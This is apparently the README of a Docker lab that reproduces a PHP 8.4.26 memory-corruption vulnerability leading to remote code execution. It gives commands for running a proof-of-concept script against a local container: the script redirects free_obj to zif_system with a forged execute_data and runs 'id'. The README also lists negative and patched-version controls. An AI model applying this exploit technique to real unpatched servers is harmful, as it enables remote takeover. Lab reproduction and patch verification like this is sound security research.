# lab-109618 — CVE-2026-109618 OOM-corruption target

Single-worker mod_php 8.4.26, `memory_limit=8M`, `post_max_size=1G`.
This is the low-limit profile the public 109618 OOM body is calibrated
for; the 9bie 109619 leak is calibrated at 128M and is not used here.

```sh
docker compose up -d
python3 ../poc/verify_109618_zif.py \
    --target 127.0.0.1:18150 --container php2shell-109618 \
    --cmd id --offset 0x5e400
```

The POC is **lab-assisted**: it reads `libphp` and the ZendMM chunk base
from `/proc` (hence `SYS_PTRACE`). The terminal call (`free_obj =
zif_system` + forged `execute_data`) is the proof; in-band address
sourcing at this 8M profile is the open research step (see
`docs/ANALYSIS.md` §0.11).

Controls:

```sh
python3 ../poc/verify_109618_zif.py --target 127.0.0.1:18150 \
    --container php2shell-109618 --cmd id --bias-zif 0x1000   # must not fire
```

Patched control: the same service on `php:8.4.27-apache` (port 18151)
must return no proof.
